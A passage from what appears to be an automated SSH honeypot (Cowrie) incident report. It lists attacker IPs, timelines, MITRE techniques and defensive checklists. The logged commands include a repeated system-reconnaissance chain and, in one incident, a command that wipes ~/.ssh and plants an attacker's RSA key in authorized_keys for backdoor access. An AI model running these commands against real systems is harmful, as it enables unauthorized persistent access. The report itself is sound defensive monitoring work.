| `2026-07-11 12:08:59` | `cowrie.command.input` |
| `2026-07-11 12:08:59` | `cowrie.command.input` |
| `2026-07-11 12:08:59` | `cowrie.command.input` |
| `2026-07-11 12:08:59` | `cowrie.command.input` |
| `2026-07-11 12:08:59` | `cowrie.command.input` |
| `2026-07-11 12:08:59` | `cowrie.command.success` |
| `2026-07-11 12:08:59` | `cowrie.command.input` |
| `2026-07-11 12:08:59` | `cowrie.command.input` |
| `2026-07-11 12:08:59` | `cowrie.command.input` |
| `2026-07-11 12:08:59` | `cowrie.command.input` |
| `2026-07-11 12:08:59` | `cowrie.log.closed` |
| `2026-07-11 12:09:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03a3a5730889

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-11 12:10 |
| **Last Seen** | 2026-07-11 12:10 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:10:19` | `cowrie.session.connect` |
| `2026-07-11 12:10:19` | `cowrie.client.version` |
| `2026-07-11 12:10:19` | `cowrie.client.kex` |
| `2026-07-11 12:10:22` | `cowrie.login.success` |
| `2026-07-11 12:10:24` | `cowrie.session.params` |
| `2026-07-11 12:10:24` | `cowrie.command.input` |
| `2026-07-11 12:10:24` | `cowrie.command.input` |
| `2026-07-11 12:10:24` | `cowrie.command.input` |
| `2026-07-11 12:10:24` | `cowrie.command.input` |
| `2026-07-11 12:10:24` | `cowrie.command.input` |
| `2026-07-11 12:10:24` | `cowrie.command.success` |
| `2026-07-11 12:10:24` | `cowrie.command.input` |
| `2026-07-11 12:10:24` | `cowrie.command.input` |
| `2026-07-11 12:10:24` | `cowrie.command.input` |
| `2026-07-11 12:10:24` | `cowrie.command.input` |
| `2026-07-11 12:10:25` | `cowrie.log.closed` |
| `2026-07-11 12:10:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4933d0ff5051

| Field | Detail |
|---|---|
| **Source IP** | `118.194.235[.]105` |
| **First Seen** | 2026-07-11 12:10 |
| **Last Seen** | 2026-07-11 12:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:10:34` | `cowrie.session.connect` |
| `2026-07-11 12:10:34` | `cowrie.client.version` |
| `2026-07-11 12:10:34` | `cowrie.client.kex` |
| `2026-07-11 12:10:34` | `cowrie.login.success` |
| `2026-07-11 12:10:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.194.235[.]105` to AbuseIPDB if not already reported
- [ ] Block `118.194.235[.]105` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad6ce4ec19a8

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-07-11 12:10 |
| **Last Seen** | 2026-07-11 12:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:10:35` | `cowrie.session.connect` |
| `2026-07-11 12:10:35` | `cowrie.client.version` |
| `2026-07-11 12:10:35` | `cowrie.client.kex` |
| `2026-07-11 12:10:35` | `cowrie.login.success` |
| `2026-07-11 12:10:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e34fb567e548

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 12:10 |
| **Last Seen** | 2026-07-11 12:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:10:50` | `cowrie.session.connect` |
| `2026-07-11 12:10:51` | `cowrie.client.version` |
| `2026-07-11 12:10:51` | `cowrie.client.kex` |
| `2026-07-11 12:10:52` | `cowrie.login.success` |
| `2026-07-11 12:10:53` | `cowrie.session.params` |
| `2026-07-11 12:10:53` | `cowrie.command.input` |
| `2026-07-11 12:10:53` | `cowrie.command.input` |
| `2026-07-11 12:10:53` | `cowrie.command.input` |
| `2026-07-11 12:10:53` | `cowrie.command.input` |
| `2026-07-11 12:10:53` | `cowrie.command.input` |
| `2026-07-11 12:10:53` | `cowrie.command.success` |
| `2026-07-11 12:10:53` | `cowrie.command.input` |
| `2026-07-11 12:10:53` | `cowrie.command.input` |
| `2026-07-11 12:10:53` | `cowrie.command.input` |
| `2026-07-11 12:10:53` | `cowrie.command.input` |
| `2026-07-11 12:10:53` | `cowrie.log.closed` |
| `2026-07-11 12:10:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a34e1ef2e1b7

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-11 12:12 |
| **Last Seen** | 2026-07-11 12:12 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:12:14` | `cowrie.session.connect` |
| `2026-07-11 12:12:15` | `cowrie.client.version` |
| `2026-07-11 12:12:15` | `cowrie.client.kex` |
| `2026-07-11 12:12:17` | `cowrie.login.success` |
| `2026-07-11 12:12:19` | `cowrie.session.params` |
| `2026-07-11 12:12:19` | `cowrie.command.input` |
| `2026-07-11 12:12:19` | `cowrie.command.input` |
| `2026-07-11 12:12:19` | `cowrie.command.input` |
| `2026-07-11 12:12:19` | `cowrie.command.input` |
| `2026-07-11 12:12:19` | `cowrie.command.input` |
| `2026-07-11 12:12:19` | `cowrie.command.success` |
| `2026-07-11 12:12:19` | `cowrie.command.input` |
| `2026-07-11 12:12:19` | `cowrie.command.input` |
| `2026-07-11 12:12:19` | `cowrie.command.input` |
| `2026-07-11 12:12:19` | `cowrie.command.input` |
| `2026-07-11 12:12:20` | `cowrie.log.closed` |
| `2026-07-11 12:12:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd2f134c4264

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 12:12 |
| **Last Seen** | 2026-07-11 12:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:12:43` | `cowrie.session.connect` |
| `2026-07-11 12:12:43` | `cowrie.client.version` |
| `2026-07-11 12:12:43` | `cowrie.client.kex` |
| `2026-07-11 12:12:45` | `cowrie.login.success` |
| `2026-07-11 12:12:46` | `cowrie.session.params` |
| `2026-07-11 12:12:46` | `cowrie.command.input` |
| `2026-07-11 12:12:46` | `cowrie.command.input` |
| `2026-07-11 12:12:46` | `cowrie.command.input` |
| `2026-07-11 12:12:46` | `cowrie.command.input` |
| `2026-07-11 12:12:46` | `cowrie.command.input` |
| `2026-07-11 12:12:46` | `cowrie.command.success` |
| `2026-07-11 12:12:46` | `cowrie.command.input` |
| `2026-07-11 12:12:46` | `cowrie.command.input` |
| `2026-07-11 12:12:46` | `cowrie.command.input` |
| `2026-07-11 12:12:46` | `cowrie.command.input` |
| `2026-07-11 12:12:46` | `cowrie.log.closed` |
| `2026-07-11 12:12:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a4b1244d2b1

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-11 12:14 |
| **Last Seen** | 2026-07-11 12:14 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:14:05` | `cowrie.session.connect` |
| `2026-07-11 12:14:05` | `cowrie.client.version` |
| `2026-07-11 12:14:05` | `cowrie.client.kex` |
| `2026-07-11 12:14:07` | `cowrie.login.success` |
| `2026-07-11 12:14:09` | `cowrie.session.params` |
| `2026-07-11 12:14:09` | `cowrie.command.input` |
| `2026-07-11 12:14:09` | `cowrie.command.input` |
| `2026-07-11 12:14:09` | `cowrie.command.input` |
| `2026-07-11 12:14:09` | `cowrie.command.input` |
| `2026-07-11 12:14:09` | `cowrie.command.input` |
| `2026-07-11 12:14:09` | `cowrie.command.success` |
| `2026-07-11 12:14:10` | `cowrie.command.input` |
| `2026-07-11 12:14:10` | `cowrie.command.input` |
| `2026-07-11 12:14:10` | `cowrie.command.input` |
| `2026-07-11 12:14:10` | `cowrie.command.input` |
| `2026-07-11 12:14:10` | `cowrie.log.closed` |
| `2026-07-11 12:14:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-283bc0e2434e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 12:14 |
| **Last Seen** | 2026-07-11 12:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:14:30` | `cowrie.session.connect` |
| `2026-07-11 12:14:30` | `cowrie.client.version` |
| `2026-07-11 12:14:30` | `cowrie.client.kex` |
| `2026-07-11 12:14:31` | `cowrie.login.success` |
| `2026-07-11 12:14:32` | `cowrie.session.params` |
| `2026-07-11 12:14:32` | `cowrie.command.input` |
| `2026-07-11 12:14:32` | `cowrie.command.input` |
| `2026-07-11 12:14:32` | `cowrie.command.input` |
| `2026-07-11 12:14:32` | `cowrie.command.input` |
| `2026-07-11 12:14:32` | `cowrie.command.input` |
| `2026-07-11 12:14:32` | `cowrie.command.success` |
| `2026-07-11 12:14:32` | `cowrie.command.input` |
| `2026-07-11 12:14:32` | `cowrie.command.input` |
| `2026-07-11 12:14:32` | `cowrie.command.input` |
| `2026-07-11 12:14:32` | `cowrie.command.input` |
| `2026-07-11 12:14:32` | `cowrie.log.closed` |
| `2026-07-11 12:14:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bc1bc160e1c

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-11 12:15 |
| **Last Seen** | 2026-07-11 12:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:15:17` | `cowrie.session.connect` |
| `2026-07-11 12:15:17` | `cowrie.client.version` |
| `2026-07-11 12:15:17` | `cowrie.client.kex` |
| `2026-07-11 12:15:18` | `cowrie.login.success` |
| `2026-07-11 12:15:18` | `cowrie.direct-tcpip.request` |
| `2026-07-11 12:15:18` | `cowrie.direct-tcpip.data` |
| `2026-07-11 12:15:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45d8eebe7df5

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-11 12:15 |
| **Last Seen** | 2026-07-11 12:16 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:15:54` | `cowrie.session.connect` |
| `2026-07-11 12:15:55` | `cowrie.client.version` |
| `2026-07-11 12:15:55` | `cowrie.client.kex` |
| `2026-07-11 12:15:57` | `cowrie.login.success` |
| `2026-07-11 12:15:58` | `cowrie.session.params` |
| `2026-07-11 12:15:58` | `cowrie.command.input` |
| `2026-07-11 12:15:58` | `cowrie.command.input` |
| `2026-07-11 12:15:58` | `cowrie.command.input` |
| `2026-07-11 12:15:58` | `cowrie.command.input` |
| `2026-07-11 12:15:58` | `cowrie.command.input` |
| `2026-07-11 12:15:58` | `cowrie.command.success` |
| `2026-07-11 12:15:58` | `cowrie.command.input` |
| `2026-07-11 12:15:58` | `cowrie.command.input` |
| `2026-07-11 12:15:58` | `cowrie.command.input` |
| `2026-07-11 12:15:58` | `cowrie.command.input` |
| `2026-07-11 12:15:59` | `cowrie.log.closed` |
| `2026-07-11 12:16:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b776a8673a92

| Field | Detail |
|---|---|
| **Source IP** | `211.46.177[.]174` |
| **First Seen** | 2026-07-11 12:16 |
| **Last Seen** | 2026-07-11 12:16 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:16:16` | `cowrie.session.connect` |
| `2026-07-11 12:16:16` | `cowrie.client.version` |
| `2026-07-11 12:16:16` | `cowrie.client.kex` |
| `2026-07-11 12:16:17` | `cowrie.login.success` |
| `2026-07-11 12:16:18` | `cowrie.session.params` |
| `2026-07-11 12:16:18` | `cowrie.command.input` |
| `2026-07-11 12:16:18` | `cowrie.command.failed` |
| `2026-07-11 12:16:19` | `cowrie.log.closed` |
| `2026-07-11 12:16:19` | `cowrie.session.params` |
| `2026-07-11 12:16:19` | `cowrie.command.input` |
| `2026-07-11 12:16:19` | `cowrie.session.file_download` |
| `2026-07-11 12:16:19` | `cowrie.log.closed` |
| `2026-07-11 12:16:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.46.177[.]174` to AbuseIPDB if not already reported
- [ ] Block `211.46.177[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf031b8e9195

| Field | Detail |
|---|---|
| **Source IP** | `211.46.177[.]174` |
| **First Seen** | 2026-07-11 12:16 |
| **Last Seen** | 2026-07-11 12:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:16:20` | `cowrie.session.connect` |
| `2026-07-11 12:16:20` | `cowrie.client.version` |
| `2026-07-11 12:16:20` | `cowrie.client.kex` |
| `2026-07-11 12:16:21` | `cowrie.login.success` |
| `2026-07-11 12:16:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.46.177[.]174` to AbuseIPDB if not already reported
- [ ] Block `211.46.177[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2266d2945072

| Field | Detail |
|---|---|
| **Source IP** | `211.46.177[.]174` |
| **First Seen** | 2026-07-11 12:16 |
| **Last Seen** | 2026-07-11 12:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:16:21` | `cowrie.session.connect` |
| `2026-07-11 12:16:21` | `cowrie.client.version` |
| `2026-07-11 12:16:21` | `cowrie.client.kex` |
| `2026-07-11 12:16:22` | `cowrie.login.success` |
| `2026-07-11 12:16:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.46.177[.]174` to AbuseIPDB if not already reported
- [ ] Block `211.46.177[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b675875c4f84

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 12:16 |
| **Last Seen** | 2026-07-11 12:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:16:22` | `cowrie.session.connect` |
| `2026-07-11 12:16:22` | `cowrie.client.version` |
| `2026-07-11 12:16:22` | `cowrie.client.kex` |
| `2026-07-11 12:16:23` | `cowrie.login.success` |
| `2026-07-11 12:16:24` | `cowrie.session.params` |
| `2026-07-11 12:16:24` | `cowrie.command.input` |
| `2026-07-11 12:16:24` | `cowrie.command.input` |
| `2026-07-11 12:16:24` | `cowrie.command.input` |
| `2026-07-11 12:16:24` | `cowrie.command.input` |
| `2026-07-11 12:16:24` | `cowrie.command.input` |
| `2026-07-11 12:16:24` | `cowrie.command.success` |
| `2026-07-11 12:16:24` | `cowrie.command.input` |
| `2026-07-11 12:16:24` | `cowrie.command.input` |
| `2026-07-11 12:16:24` | `cowrie.command.input` |
| `2026-07-11 12:16:24` | `cowrie.command.input` |
| `2026-07-11 12:16:24` | `cowrie.log.closed` |
| `2026-07-11 12:16:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1febc3016992

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-11 12:17 |
| **Last Seen** | 2026-07-11 12:17 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:17:44` | `cowrie.session.connect` |
| `2026-07-11 12:17:44` | `cowrie.client.version` |
| `2026-07-11 12:17:44` | `cowrie.client.kex` |
| `2026-07-11 12:17:46` | `cowrie.login.success` |
| `2026-07-11 12:17:48` | `cowrie.session.params` |
| `2026-07-11 12:17:48` | `cowrie.command.input` |
| `2026-07-11 12:17:48` | `cowrie.command.input` |
| `2026-07-11 12:17:48` | `cowrie.command.input` |
| `2026-07-11 12:17:48` | `cowrie.command.input` |
